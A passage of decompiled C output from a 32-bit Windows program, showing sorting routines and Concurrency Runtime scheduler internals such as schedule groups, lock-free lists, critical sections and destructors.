      v26 = v2 + 1;
      if ( v2 + 1 < a2 )
      {
        v27 = 4 * v2;
        do
        {
          if ( **(_DWORD **)(a1 + 4 * v26) >= **(_DWORD **)(v27 + a1) )
          {
            v28 = v41;
          }
          else
          {
            v28 = v26;
            v41 = v26;
            v27 = 4 * v26;
          }
          ++v26;
        }
        while ( v26 < a2 );
        if ( v35 != v28 )
        {
          v34 = *(_DWORD *)(a1 + 4 * v35);
          *(_DWORD *)(a1 + 4 * v35) = *(_DWORD *)(a1 + 4 * v28);
          *(_DWORD *)(a1 + 4 * v41) = v34;
        }
        v25 = v37;
      }
      v2 = v25;
      v35 = v25;
    }
    while ( v25 < a2 );
  }
}

//----- (0047375B) --------------------------------------------------------
char __thiscall sub_47375B(volatile signed __int32 *this)
{
  volatile signed __int32 *v1; // esi
  signed __int32 v2; // edx

  v1 = this + 1;
  while ( *v1 )
  {
    v2 = *v1;
    if ( _InterlockedCompareExchange(v1, v2 + 1, v2) == v2 )
      return 1;
  }
  return 0;
}

//----- (0047377A) --------------------------------------------------------
unsigned int __thiscall sub_47377A(_DWORD *this, _DWORD *a2)
{
  unsigned int v3; // ecx
  int v4; // esi
  unsigned int result; // eax
  int v6; // ebx
  int v7; // edx
  int v8; // eax
  int v9; // edx
  unsigned int v10; // ecx
  int v11; // esi
  int v12; // eax
  int v13; // edx
  int v14; // edx
  _DWORD *v15; // ecx
  int v16; // eax
  unsigned int v17; // ecx
  int v18; // ebx
  unsigned int v19; // edx
  int v20; // ecx
  int v21; // eax
  int v22; // esi
  _DWORD *v23; // esi
  _DWORD *v24; // ecx
  bool v25; // zf
  unsigned int v26; // [esp+Ch] [ebp-20h]
  int v27; // [esp+10h] [ebp-1Ch]
  unsigned int v28; // [esp+10h] [ebp-1Ch]
  unsigned int v29; // [esp+14h] [ebp-18h]
  int v30; // [esp+14h] [ebp-18h]
  int v31; // [esp+18h] [ebp-14h]
  unsigned int v32; // [esp+18h] [ebp-14h]
  int v33; // [esp+1Ch] [ebp-10h]
  int v34; // [esp+20h] [ebp-Ch]
  unsigned int v35; // [esp+20h] [ebp-Ch]
  int v36; // [esp+24h] [ebp-8h]
  int v37; // [esp+24h] [ebp-8h]
  unsigned int v38; // [esp+28h] [ebp-4h]
  int v39; // [esp+28h] [ebp-4h]

  v3 = 0;
  v4 = 48;
  v29 = 0;
  result = this[6];
  v33 = 48;
  if ( result )
  {
    v6 = 0;
    v34 = 48;
    v27 = 0;
    v7 = 48;
    do
    {
      v38 = 0;
      v8 = v6 + this[18];
      if ( *(_DWORD *)(v8 + 4) )
      {
        v36 = 0;
        v9 = 0;
        v10 = 0;
        v31 = 0;
        do
        {
          v11 = v9 + *(_DWORD *)(v8 + 32);
          v12 = *(_DWORD *)(v11 + 20);
          *(_DWORD *)(v11 + 20) = 0;
          *(_DWORD *)(v11 + 24) = v12;
          v13 = this[25];
          if ( v13 )
            v14 = *(_DWORD *)(v13 + 24);
          else
            v14 = 0;
          if ( v14 )
          {
            do
            {
              v15 = (_DWORD *)(v36 + *(_DWORD *)(v34 + *(_DWORD *)(v14 + 16)));
              v15[8] = v15[7];
              v16 = v15[6];
              v15[7] = v16;
              *(_DWORD *)(v11 + 20) += v16;
              if ( v14 == this[25] )
                v14 = 0;
              else
                v14 = *(_DWORD *)(v14 + 24);
            }
            while ( v14 );
            v6 = v27;
            v10 = v38;
          }
          ++v10;
          v8 = v6 + this[18];
          v36 += 52;
          v9 = v31 + 36;
          v38 = v10;
          v31 += 36;
        }
        while ( v10 < *(_DWORD *)(v8 + 4) );
        v3 = v29;
        v7 = v34;
      }
      result = this[6];
      ++v3;
      v6 += 40;
      v29 = v3;
      v7 += 52;
      v27 = v6;
      v34 = v7;
    }
    while ( v3 < result );
    v4 = 48;
  }
  v17 = 0;
  v32 = 0;
  if ( result )
  {
    v18 = 0;
    v39 = 0;
    do
    {
      v19 = 0;
      result = v18 + this[18];
      v28 = 0;
      if ( *(_DWORD *)(result + 4) )
      {
        v37 = 0;
        v20 = 0;
        v30 = 0;
        do
        {
          v21 = *(_DWORD *)(result + 32);
          v26 = *(_DWORD *)(v21 + v20 + 24);
          v22 = this[25];
          v35 = *(_DWORD *)(v21 + v20 + 20);
          if ( v22 )
            v23 = *(_DWORD **)(v22 + 24);
          else
            v23 = 0;
          if ( v23 )
          {
            while ( 1 )
            {
              if ( v23[33] == v23[32] )
              {
                v24 = (_DWORD *)(v37 + *(_DWORD *)(v33 + v23[4]));
                if ( v24[9] )
                {
                  if ( v23 == a2 )
                  {
                    sub_47B691((int)v23, (int)v24, v35 > v24[7]);
                  }
                  else
                  {
                    if ( v26 != v24[8] )
                    {
                      v25 = v35 == v24[7];
LABEL_34:
                      if ( v25 && v26 > v24[8] )
                        sub_47B691((int)v23, (int)v24, 0);
                      goto LABEL_37;
                    }
                    v25 = v35 == v24[7];
                    if ( v35 <= v24[7] )
                      goto LABEL_34;
                    sub_47B691((int)v23, (int)v24, 1);
                  }
                }
              }
LABEL_37:
              if ( v23 == (_DWORD *)this[25] )
                v23 = 0;
              else
                v23 = (_DWORD *)v23[6];
              if ( !v23 )
              {
                v18 = v39;
                v19 = v28;
                v20 = v30;
                break;
              }
            }
          }
          ++v19;
          v37 += 52;
          result = v18 + this[18];
          v20 += 36;
          v28 = v19;
          v30 = v20;
        }
        while ( v19 < *(_DWORD *)(result + 4) );
        v17 = v32;
        v4 = v33;
      }
      ++v17;
      v18 += 40;
      v4 += 52;
      v32 = v17;
      v39 = v18;
      v33 = v4;
    }
    while ( v17 < this[6] );
  }
  return result;
}

//----- (00473957) --------------------------------------------------------
_DWORD *__thiscall sub_473957(_DWORD *this, int a2, char a3)
{
  _DWORD *result; // eax
  int v5; // edi
  int v6; // edi
  int v7; // [esp+10h] [ebp-4h]

  sub_472139((int)this);
  memset((void *)(a2 + 64), 0, 0x30u);
  sub_472596(this, 0, a2, a2 + 64);
  *(double *)(a2 + 96) = (double)sub_4707A1((_DWORD *)a2);
  *(_BYTE *)(a2 + 104) = a3;
  result = (_DWORD *)this[21];
  v7 = 1;
  *result = a2 + 64;
  v5 = this[25];
  if ( v5 )
    v6 = *(_DWORD *)(v5 + 24);
  else
    v6 = 0;
  if ( v6 )
  {
    result = (_DWORD *)a2;
    do
    {
      if ( (_DWORD *)v6 != result )
      {
        memset((void *)(v6 + 64), 0, 0x30u);
        sub_472596(this, v7, v6, v6 + 64);
        *(double *)(v6 + 96) = (double)sub_4707A1((_DWORD *)v6);
        *(_DWORD *)(this[21] + 4 * v7) = v6 + 64;
        result = (_DWORD *)a2;
        ++v7;
      }
      if ( v6 == this[25] )
        v6 = 0;
      else
        v6 = *(_DWORD *)(v6 + 24);
    }
    while ( v6 );
  }
  return result;
}

//----- (00473A26) --------------------------------------------------------
int __thiscall sub_473A26(int this, _DWORD *a2)
{
  struct _RTL_CRITICAL_SECTION *v3; // esi
  unsigned int v4; // edx
  unsigned int *v5; // ecx
  unsigned int v6; // eax
  int v7; // edx
  unsigned int v8; // esi
  unsigned int v10; // [esp+10h] [ebp-14h]
  int v11; // [esp+10h] [ebp-14h]
  unsigned int v12; // [esp+14h] [ebp-10h]

  v3 = (struct _RTL_CRITICAL_SECTION *)(this + 44);
  sub_46F04D((LPCRITICAL_SECTION)(this + 44));
  sub_47308D((_DWORD *)(this + 96), (int)a2);
  v4 = 0;
  v10 = 0;
  if ( *(_DWORD *)(this + 24) )
  {
    v5 = (unsigned int *)(a2[4] + 4);
    do
    {
      if ( v5[6] )
      {
        v6 = 0;
        v12 = 0;
        if ( *v5 )
        {
          v7 = 0;
          do
          {
            v8 = v5[11];
            if ( *(_DWORD *)(v8 + v7) == 4 )
            {
              --**(_DWORD **)(v8 + v7 + 20);
              v6 = v12;
            }
            ++v6;
            v7 += 52;
            v12 = v6;
          }
          while ( v6 < *v5 );
          v4 = v10;
        }
      }
      ++v4;
      v5 += 13;
      v10 = v4;
    }
    while ( v4 < *(_DWORD *)(this + 24) );
    v3 = (struct _RTL_CRITICAL_SECTION *)(this + 44);
  }
  if ( a2[33] == a2[32] )
    --*(_DWORD *)(this + 16);
  v11 = *(_DWORD *)(this + 8) - 1;
  *(_DWORD *)(this + 8) = v11;
  if ( v11 == 1 )
    *(_DWORD *)(this + 40) = 0;
  sub_46F193(v3);
  if ( v11 == 1 )
    SetEvent(*(HANDLE *)(this + 80));
  return (*(int (__thiscall **)(_DWORD *))(*a2 + 32))(a2);
}

//----- (00473AF8) --------------------------------------------------------
_DWORD *__thiscall sub_473AF8(int this, _DWORD *a2)
{
  struct _RTL_CRITICAL_SECTION *v3; // esi
  _DWORD *v4; // edi

  v3 = (struct _RTL_CRITICAL_SECTION *)(this + 44);
  sub_46F04D((LPCRITICAL_SECTION)(this + 44));
  v4 = sub_47B489(a2);
  if ( !v4 )
    v4 = sub_472440((unsigned int *)this, a2, 0, 1);
  sub_46F193(v3);
  return v4;
}

//----- (00473B4C) --------------------------------------------------------
_DWORD *__thiscall sub_473B4C(_DWORD *this, int a2, int a3, _DWORD *a4, _DWORD *a5, int a6)
{
  _DWORD *result; // eax

  if ( *(_BYTE *)(a3 + 48) )
  {
    *(_BYTE *)(a3 + 48) = 0;
    --*(_DWORD *)(a6 + 20);
    --*(_DWORD *)(a2 + 40);
    if ( *(_BYTE *)(a3 + 49) )
    {
      --*(_DWORD *)(a6 + 24);
      --*(_DWORD *)(a2 + 44);
    }
    if ( *a5 == 6 )
    {
      result = a4;
      *a5 = 0;
      --a4[7];
      --this[8];
    }
    --a5[7];
  }
  else
  {
    *(_BYTE *)(a3 + 48) = 1;
    ++*(_DWORD *)(a6 + 20);
    ++*(_DWORD *)(a2 + 40);
    if ( *(_BYTE *)(a3 + 49) )
    {
      ++*(_DWORD *)(a6 + 24);
      ++*(_DWORD *)(a2 + 44);
    }
    result = a5;
    ++a5[7];
  }
  return result;
}

//----- (00473BB5) --------------------------------------------------------
int sub_473BB5()
{
  int result; // eax

  result = dword_4F0BF4;
  if ( !dword_4F0BF4 )
  {
    sub_46FC8F(&dword_4F0C34);
    result = dword_4F0BF4;
    if ( !dword_4F0BF4 )
    {
      sub_4734B5();
      result = dword_4F0BF4;
    }
    dword_4F0C34 = 0;
  }
  return result;
}
// 4F0BF4: using guessed type int dword_4F0BF4;
// 4F0C34: using guessed type int dword_4F0C34;

//----- (00473BFE) --------------------------------------------------------
int __cdecl sub_473BFE(int a1)
{
  int result; // eax

  if ( a1 )
    return (*(int (__thiscall **)(int, int))(*(_DWORD *)a1 + 20))(a1, 1);
  return result;
}

//----- (00473C21) --------------------------------------------------------
int __cdecl sub_473C21(int a1)
{
  int result; // eax

  if ( a1 )
    return (*(int (__thiscall **)(int, int))(*(_DWORD *)(a1 + 4) + 20))(a1 + 4, 1);
  return result;
}

//----- (00473C46) --------------------------------------------------------
int __cdecl sub_473C46(int a1)
{
  int result; // eax

  if ( a1 )
    return (*(int (__thiscall **)(int, int))(*(_DWORD *)a1 + 16))(a1, 1);
  return result;
}

//----- (00473C69) --------------------------------------------------------
unsigned int *__thiscall sub_473C69(unsigned int *this, unsigned int a2)
{
  void *v3; // eax
  size_t v5; // [esp-8h] [ebp-Ch]

  this[1] = 0;
  *this = a2;
  v3 = (void *)unknown_libname_28((unsigned __int64)a2 >> 30 != 0 ? -1 : 4 * a2);
  v5 = 4 * *this;
  this[2] = (unsigned int)v3;
  memset(v3, 0, v5);
  return this;
}
// 46D404: using guessed type int __cdecl unknown_libname_28(_DWORD);

//----- (00473CA7) --------------------------------------------------------
PSLIST_HEADER __thiscall sub_473CA7(PSLIST_HEADER ListHead, int a2, int a3, int a4)
{
  int v4; // edx
  int v6; // edx
  int v7; // edx
  struct _SINGLE_LIST_ENTRY *v8; // edi
  struct _SINGLE_LIST_ENTRY *v9; // eax
  struct _SINGLE_LIST_ENTRY **v10; // eax
  struct _SINGLE_LIST_ENTRY *Next; // ecx
  int v12; // ecx
  int v13; // eax

  v4 = a3;
  *(_DWORD *)&ListHead[4].Depth = a2;
  *(_DWORD *)&ListHead[8].Depth = a4;
  ListHead[2].Next.Next = 0;
  *(_QWORD *)&ListHead[5].Depth = 0i64;
  ListHead[7].Next.Next = (struct _SINGLE_LIST_ENTRY *)512;
  *(_QWORD *)&ListHead[7].Depth = 1i64;
  ListHead[9].Next.Next = 0;
  if ( ((v4 - 1) & v4) != 0 )
  {
    v6 = (((a3 >> 1) | a3) >> 2) | (a3 >> 1) | a3;
    v7 = (((v6 >> 4) | v6) >> 8) | (v6 >> 4) | v6;
    v4 = ((v7 >> 16) | v7) + 1;
  }
  ListHead[5].Next.Next = (struct _SINGLE_LIST_ENTRY *)v4;
  v8 = (struct _SINGLE_LIST_ENTRY *)unknown_libname_28((unsigned __int64)(unsigned int)v4 >> 30 != 0 ? -1 : 4 * v4);
  memset(v8, 0, 4 * (int)ListHead[5].Next.Next);
  v9 = (struct _SINGLE_LIST_ENTRY *)operator new(0xCu);
  if ( v9 )
  {
    v9[2].Next = (struct _SINGLE_LIST_ENTRY *)-1;
    v9->Next = v8;
    v9[1].Next = 0;
  }
  else
  {
    v9 = 0;
  }
  ListHead[6].Next.Next = v9;
  v10 = (struct _SINGLE_LIST_ENTRY **)unknown_libname_28(
                                        (unsigned __int64)(unsigned int)ListHead[7].Next.Next >> 30 != 0
                                      ? -1
                                      : 4 * (int)ListHead[7].Next.Next);
  Next = ListHead[6].Next.Next;
  *(_DWORD *)&ListHead[6].Depth = v10;
  *v10 = Next;
  InitializeSListHead(ListHead);
  InitializeSListHead(ListHead + 1);
  v12 = (int)ListHead[5].Next.Next >> 1;
  if ( v12 )
  {
    v13 = *(_DWORD *)&ListHead[5].Depth;
    do
    {
      ++v13;
      v12 >>= 1;
    }
    while ( v12 );
    *(_DWORD *)&ListHead[5].Depth = v13;
  }
  return ListHead;
}
// 46C4D2: using guessed type void *__cdecl operator new(size_t Size);
// 46D404: using guessed type int __cdecl unknown_libname_28(_DWORD);

//----- (00473D9E) --------------------------------------------------------
_DWORD *__thiscall sub_473D9E(_DWORD *this, int a2, int a3, _DWORD *a4)
{
  sub_47EF5E(this, a2, a3, a4);
  *this = &Concurrency::details::CacheLocalScheduleGroupSegment::`vftable';
  this[74] = 0;
  this[75] = this + 74;
  this[76] = 0;
  return this;
}
// 4C0AC8: using guessed type void *Concurrency::details::CacheLocalScheduleGroupSegment::`vftable';

//----- (00473DD6) --------------------------------------------------------
_DWORD *__thiscall sub_473DD6(_DWORD *this, int a2, int a3, _DWORD *a4)
{
  sub_47EF5E(this, a2, a3, a4);
  *this = &Concurrency::details::FairScheduleGroupSegment::`vftable';
  this[74] = 0;
  this[75] = this + 74;
  this[76] = 0;
  return this;
}
// 4C0B08: using guessed type void *Concurrency::details::FairScheduleGroupSegment::`vftable';

//----- (00473E0E) --------------------------------------------------------
_DWORD *__thiscall sub_473E0E(_DWORD *this)
{
  *this = 0;
  this[1] = 0;
  this[2] = 0;
  this[3] = 0;
  return this;
}

//----- (00473E26) --------------------------------------------------------
_DWORD *__thiscall sub_473E26(_DWORD *this, int a2)
{
  void *v3; // eax
  unsigned int v4; // ecx

  *this = a2;
  v3 = (void *)unknown_libname_28((unsigned __int64)((unsigned int)(a2 + 31) >> 5) >> 30 != 0 ? -1 : 4 * ((unsigned int)(a2 + 31) >> 5));
  v4 = *this + 31;
  this[1] = v3;
  memset(v3, 0, 4 * (v4 >> 5));
  return this;
}
// 46D404: using guessed type int __cdecl unknown_libname_28(_DWORD);

//----- (00473E6C) --------------------------------------------------------
HANDLE *__thiscall sub_473E6C(HANDLE *this, const void **a2)
{
  unsigned int v3; // esi
  int v4; // eax
  void *v5; // eax
  int v6; // eax
  int v7; // eax
  int v8; // eax
  int LastError; // eax
  _DWORD v11[4]; // [esp+10h] [ebp-40h] BYREF
  _DWORD pExceptionObject[4]; // [esp+20h] [ebp-30h] BYREF
  _DWORD v13[7]; // [esp+30h] [ebp-20h] BYREF
  int v14; // [esp+4Ch] [ebp-4h]

  v13[4] = this;
  *this = &Concurrency::details::SchedulerBase::`vftable';
  v14 = 0;
  sub_479A64(this + 1, a2);
  this[12] = 0;
  this[13] = 0;
  this[14] = 0;
  this[15] = 0;
  this[16] = 0;
  this[17] = 0;
  this[18] = 0;
  this[19] = 0;
  this[20] = 0;
  this[21] = 0;
  this[22] = 0;
  sub_473CA7((PSLIST_HEADER)this + 12, 0, 256, 64);
  this[45] = 0;
  this[46] = 0;
  sub_46ED55(this + 47);
  sub_473CA7((PSLIST_HEADER)this + 25, 0, 256, 0x7FFFFFFF);
  sub_46ED40((struct _RTL_CRITICAL_SECTION *)(this + 70));
  this[76] = 0;
  sub_46ED55(this + 77);
  this[79] = 0;
  this[80] = this + 79;
  this[81] = 0;
  this[82] = (HANDLE)-1;
  this[83] = (HANDLE)-1;
  this[84] = 0;
  this[85] = 0;
  this[86] = 0;
  sub_473C69((unsigned int *)this + 87, 0x1001u);
  sub_473C69((unsigned int *)this + 90, 0x1001u);
  this[93] = (HANDLE)-1;
  this[94] = 0;
  this[96] = 0;
  this[97] = 0;
  this[98] = HANDLE_FLAG_INHERIT;
  this[99] = 0;
  this[100] = 0;
  LOBYTE(v14) = 10;
  this[101] = 0;
  this[102] = 0;
  this[104] = 0;
  this[105] = 0;
  this[106] = 0;
  this[108] = 0;
  this[110] = 0;
  this[111] = 0;
  this[112] = 0;
  this[113] = 0;
  this[114] = 0;
  this[116] = 0;
  this[117] = 0;
  this[121] = 0;
  InitializeSListHead((PSLIST_HEADER)this + 61);
  InitializeSListHead((PSLIST_HEADER)this + 62);
  InitializeSListHead((PSLIST_HEADER)this + 63);
  InitializeSListHead((PSLIST_HEADER)this + 64);
  this[33] = this;
  this[2] = (HANDLE)sub_479B05(a2, 0);
  *((_WORD *)this + 8) = sub_479B05(a2, 4u);
  this[3] = (HANDLE)sub_479B05(a2, 7u);
  v3 = sub_479B05(a2, 1u);
  if ( 4 * sub_471D0E() <= v3 )
    v4 = sub_479B05(a2, 1u);
  else
    v4 = 4 * sub_471D0E();
  this[115] = (HANDLE)v4;
  this[6] = (HANDLE)sub_46F8E5();
  v5 = (void *)sub_46F509(0);
  this[118] = v5;
  if ( !RegisterWaitForSingleObject(this + 119, v5, (WAITORTIMERCALLBACK)Callback, this, 0xFFFFFFFF, 0) )
  {
    LastError = GetLastError();
    if ( LastError > 0 )
      LastError = (unsigned __int16)LastError | 0x80070000;
    sub_4778B7(v13, LastError);
    _CxxThrowException(v13, (_ThrowInfo *)&_TI2_AVscheduler_resource_allocation_error_Concurrency__);
  }
  if ( sub_471D09() < 3 )
  {
    if ( !sub_46F574(this + 120, 0, (WAITORTIMERCALLBACK)sub_4773F8, this, 0x7FFFFFFFu, 0x7FFFFFFFu, 0) )
    {
      v8 = GetLastError();
      if ( v8 > 0 )
        v8 = (unsigned __int16)v8 | 0x80070000;
      sub_4778B7(v11, v8);
      _CxxThrowException(v11, (_ThrowInfo *)&_TI2_AVscheduler_resource_allocation_error_Concurrency__);
    }
  }
  else
  {
    v6 = sub_46FB7C(0x7FFFFFFFu, (int)sub_4773E9, (int)this, 1);
    this[120] = (HANDLE)v6;
    if ( !v6 )
    {
      v7 = GetLastError();
      if ( v7 > 0 )
        v7 = (unsigned __int16)v7 | 0x80070000;
      sub_4778B7(pExceptionObject, v7);
      _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVscheduler_resource_allocation_error_Concurrency__);
    }
  }
  return this;
}
// 471D09: using guessed type int sub_471D09(void);
// 4C0A64: using guessed type void *Concurrency::details::SchedulerBase::`vftable';
// 473E6C: using guessed type _DWORD pExceptionObject[4];
// 473E6C: using guessed type _DWORD var_40[4];

//----- (0047418A) --------------------------------------------------------
char *__thiscall sub_47418A(char *this, int a2)
{
  sub_401780(this, a2);
  *(_DWORD *)this = &Concurrency::improper_scheduler_attach::`vftable';
  return this;
}
// 4C09EC: using guessed type void *Concurrency::improper_scheduler_attach::`vftable';

//----- (004741A5) --------------------------------------------------------
char *__thiscall sub_4741A5(char *this, int a2)
{
  sub_401780(this, a2);
  *(_DWORD *)this = &Concurrency::improper_scheduler_reference::`vftable';
  return this;
}
// 4C09F8: using guessed type void *Concurrency::improper_scheduler_reference::`vftable';

//----- (004741D3) --------------------------------------------------------
void __thiscall sub_4741D3(PSLIST_HEADER ListHead)
{
  PSLIST_ENTRY v2; // eax
  PSLIST_ENTRY v3; // eax
  struct _SINGLE_LIST_ENTRY *Next; // ebx
  int i; // esi
  struct _SINGLE_LIST_ENTRY *v6; // esi

  v2 = InterlockedFlushSList(ListHead);
  sub_474F1A(v2);
  v3 = InterlockedFlushSList(ListHead + 1);
  sub_474F1A(v3);
  sub_474F1A(&ListHead[2].Next.Next->Next);
  Next = ListHead[6].Next.Next;
  if ( Next )
  {
    do
    {
      for ( i = 0; i < (int)ListHead[5].Next.Next; ++i )
        sub_46C87D(Next->Next[i].Next);
      v6 = Next[1].Next;
      j_j_j___free_base(Next->Next);
      sub_46C87D(Next);
      Next = v6;
    }
    while ( v6 );
  }
  j_j_j___free_base(*(void **)&ListHead[6].Depth);
}

//----- (0047424D) --------------------------------------------------------
void __thiscall sub_47424D(PSLIST_HEADER ListHead)
{
  PSLIST_ENTRY v2; // eax
  PSLIST_ENTRY v3; // eax
  struct _SINGLE_LIST_ENTRY *Next; // ebx
  int i; // esi
  struct _SINGLE_LIST_ENTRY *v6; // esi

  v2 = InterlockedFlushSList(ListHead);
  sub_474F3B(v2);
  v3 = InterlockedFlushSList(ListHead + 1);
  sub_474F3B(v3);
  sub_474F3B(&ListHead[2].Next.Next->Next);
  Next = ListHead[6].Next.Next;
  if ( Next )
  {
    do
    {
      for ( i = 0; i < (int)ListHead[5].Next.Next; ++i )
        sub_473C46((int)Next->Next[i].Next);
      v6 = Next[1].Next;
      j_j_j___free_base(Next->Next);
      sub_46C87D(Next);
      Next = v6;
    }
    while ( v6 );
  }
  j_j_j___free_base(*(void **)&ListHead[6].Depth);
}

//----- (004742C4) --------------------------------------------------------
void __thiscall sub_4742C4(void **this)
{
  j_j_j___free_base(this[3]);
  j_j_j___free_base(this[1]);
}

//----- (004742E5) --------------------------------------------------------
void __thiscall sub_4742E5(void **this)
{
  j_j_j___free_base(this[2]);
  j_j_j___free_base(this[1]);
}

//----- (004742FC) --------------------------------------------------------
void __thiscall sub_4742FC(_DWORD *this)
{
  *this = &Concurrency::ScheduleGroup::`vftable';
}
// 4C0A04: using guessed type void *Concurrency::ScheduleGroup::`vftable';

//----- (0047430A) --------------------------------------------------------
void __thiscall sub_47430A(char *this)
{
  *(_DWORD *)this = &Concurrency::details::SchedulerBase::`vftable';
  sub_474C15((int)this);
  sub_47775C((int *)this + 90);
  j_j_j___free_base(*((void **)this + 92));
  sub_47775C((int *)this + 87);
  j_j_j___free_base(*((void **)this + 89));
  sub_46EDCA((LPCRITICAL_SECTION)(this + 280));
  sub_4741D3((PSLIST_HEADER)this + 25);
  sub_47424D((PSLIST_HEADER)this + 12);
  j_j_j___free_base(*((void **)this + 22));
  sub_4742E5((void **)this + 18);
  sub_4742E5((void **)this + 15);
  sub_4742E5((void **)this + 12);
  sub_479ADB((void **)this + 1);
  *(_DWORD *)this = &Concurrency::Scheduler::`vftable';
}
// 4C0A1C: using guessed type void *Concurrency::Scheduler::`vftable';
// 4C0A64: using guessed type void *Concurrency::details::SchedulerBase::`vftable';

//----- (004743C3) --------------------------------------------------------
int __thiscall sub_4743C3(_DWORD **this)
{
  return sub_46FCC0(*this);
}

//----- (004743F9) --------------------------------------------------------
int __thiscall sub_4743F9(_DWORD *this, int a2)
{
  int v3; // eax
  int v5; // ecx
  int v6; // esi
  int v7; // eax
  _DWORD *v8; // esi
  int v9; // eax

  v3 = a2 >> this[11];
  if ( v3 >= this[15] )
    return 0;
  v5 = this[14];
  v6 = this[13];
  if ( v3 < v5 )
  {
    v8 = *(_DWORD **)(v6 + 4 * v3);
  }
  else
  {
    v7 = v3 - v5;
    v8 = *(_DWORD **)(v6 + 4 * v5 - 4);
    if ( v7 >= 0 )
    {
      v9 = v7 + 1;
      do
      {
        v8 = (_DWORD *)v8[1];
        --v9;
      }
      while ( v9 );
    }
  }
  return *(_DWORD *)(*v8 + 4 * (a2 & (this[10] - 1)));
}

//----- (00474441) --------------------------------------------------------
char *__thiscall sub_474441(char *this, char a2)
{
  if ( (a2 & 2) != 0 )
  {
    `eh vector destructor iterator'(this, 0x10u, *((_DWORD *)this - 1), (void (__thiscall *)(void *))sub_4742C4);
    if ( (a2 & 1) != 0 )
      sub_46D40D(this - 4);
    return this - 4;
  }
  else
  {
    sub_4742C4((void **)this);
    if ( (a2 & 1) != 0 )
      sub_46C87D(this);
    return this;
  }
}
// 46C502: using guessed type void __stdcall `eh vector destructor iterator'(void *, unsigned int, unsigned int, void (__thiscall *)(void *));

//----- (004744C2) --------------------------------------------------------
_DWORD *__thiscall sub_4744C2(_DWORD *this, char a2)
{
  *this = &Concurrency::ScheduleGroup::`vftable';
  if ( (a2 & 1) != 0 )
    sub_46C87D(this);
  return this;
}
// 4C0A04: using guessed type void *Concurrency::ScheduleGroup::`vftable';

//----- (004744E5) --------------------------------------------------------
void *__thiscall sub_4744E5(void *this, char a2)
{
  sub_47F1E5((signed __int32)this);
  if ( (a2 & 1) != 0 )
    sub_46C87D(this);
  return this;
}

//----- (0047450A) --------------------------------------------------------
_DWORD *__thiscall sub_47450A(_DWORD *this, char a2)
{
  *this = &Concurrency::ScheduleGroup::`vftable';
  if ( (a2 & 1) != 0 )
    sub_46C87D(this);
  return this;
}
// 4C0A04: using guessed type void *Concurrency::ScheduleGroup::`vftable';

//----- (00474550) --------------------------------------------------------
_DWORD *__thiscall sub_474550(_DWORD *this, char a2)
{
  *this = &Concurrency::ScheduleGroup::`vftable';
  if ( (a2 & 1) != 0 )
    sub_46C87D(this);
  return this;
}
// 4C0A04: using guessed type void *Concurrency::ScheduleGroup::`vftable';

//----- (00474573) --------------------------------------------------------
_DWORD *__thiscall sub_474573(_DWORD *this, char a2)
{
  *this = &Concurrency::Scheduler::`vftable';
  if ( (a2 & 1) != 0 )
    sub_46C87D(this);
  return this;
}
// 4C0A1C: using guessed type void *Concurrency::Scheduler::`vftable';

//----- (00474596) --------------------------------------------------------
char *__thiscall sub_474596(char *this, char a2)
{
  sub_47430A(this);
  if ( (a2 & 1) != 0 )
    sub_46C87D(this);
  return this;
}

//----- (004745BB) --------------------------------------------------------
int __thiscall sub_4745BB(int this, char a2)
{
  `eh vector destructor iterator'((void *)(this + 4), 8u, 0x60u, (void (__thiscall *)(void *))sub_47D47A);
  if ( (a2 & 1) != 0 )
    sub_46C87D((void *)this);
  return this;
}
// 46C502: using guessed type void __stdcall `eh vector destructor iterator'(void *, unsigned int, unsigned int, void (__thiscall *)(void *));

//----- (0047463E) --------------------------------------------------------
int __thiscall sub_47463E(int this, signed __int32 a2)
{
  int v3; // edi
  int v4; // ebx
  volatile signed __int32 *v5; // edx
  volatile signed __int32 *v6; // eax
  signed __int32 v7; // edx
  int v8; // eax
  volatile signed __int32 *v9; // edi
  signed __int32 v10; // eax
  volatile __int32 *v11; // edi
  _DWORD *v12; // eax
  int *v13; // ecx
  int v14; // eax
  signed __int32 v15; // eax
  int v16; // edx
  size_t v18; // [esp-8h] [ebp-38h]
  char v19[8]; // [esp+Ch] [ebp-24h] BYREF
  int v20; // [esp+14h] [ebp-1Ch]
  int (*v21)(); // [esp+18h] [ebp-18h]
  _DWORD *v22; // [esp+1Ch] [ebp-14h]
  int *v23; // [esp+20h] [ebp-10h]
  volatile signed __int32 *v24; // [esp+24h] [ebp-Ch]
  int *v25; // [esp+28h] [ebp-8h]
  char v26; // [esp+2Fh] [ebp-1h]

  v26 = 0;
  v3 = 0;
  v25 = 0;
  v4 = *(_DWORD *)(this + 48);
  do
  {
    v5 = (volatile signed __int32 *)(v4 + 8);
    if ( *(int *)(v4 + 8) < -1 )
      goto LABEL_9;
    v6 = *(volatile signed __int32 **)v4;
    v7 = 0;
    v24 = *(volatile signed __int32 **)v4;
    if ( *(int *)(this + 40) <= 0 )
    {
LABEL_8:
      v5 = (volatile signed __int32 *)(v4 + 8);
      goto LABEL_9;
    }
    while ( *v6 )
    {
LABEL_7:
      ++v7;
      v24 = ++v6;
      if ( v7 >= *(_DWORD *)(this + 40) )
        goto LABEL_8;
    }
    v8 = v7 + v3;
    v9 = v24;
    v23 = (int *)v8;
    *(_DWORD *)(a2 + 24) = v8;
    v22 = *(_DWORD **)(this + 64);
    v10 = _InterlockedCompareExchange(v9, a2, 0);
    v3 = (int)v25;
    if ( v10 )
    {
      v6 = v24;
      goto LABEL_7;
    }
    v3 = (int)v23;
    v26 = 1;
    v25 = v23;
    if ( (int)v23 >= (int)v22 )
      _InterlockedIncrement((volatile signed __int32 *)(this + 64));
    v15 = v7;
    v5 = (volatile signed __int32 *)(v4 + 8);
    _InterlockedCompareExchange((volatile signed __int32 *)(v4 + 8), -1, v15);
LABEL_9:
    if ( !v26 )
    {
      _InterlockedCompareExchange(v5, -2, -1);
      v25 = (int *)(*(_DWORD *)(this + 40) + v3);
      v11 = (volatile __int32 *)(v4 + 4);
      if ( !*(_DWORD *)(v4 + 4) && !_InterlockedCompareExchange(v11, 1, 0) )
      {
        v12 = (_DWORD *)unknown_libname_28((unsigned __int64)*(unsigned int *)(this + 40) >> 30 != 0 ? -1 : 4 * *(_DWORD *)(this + 40));
        v18 = 4 * *(_DWORD *)(this + 40);
        v22 = v12;
        memset(v12, 0, v18);
        v13 = (int *)operator new(0xCu);
        v23 = v13;
        if ( v13 )
        {
          v14 = (int)v22;
          v13[1] = 0;
          v13[2] = -1;
          *v13 = v14;
        }
        else
        {
          v13 = 0;
        }
        v16 = *(_DWORD *)(this + 60);
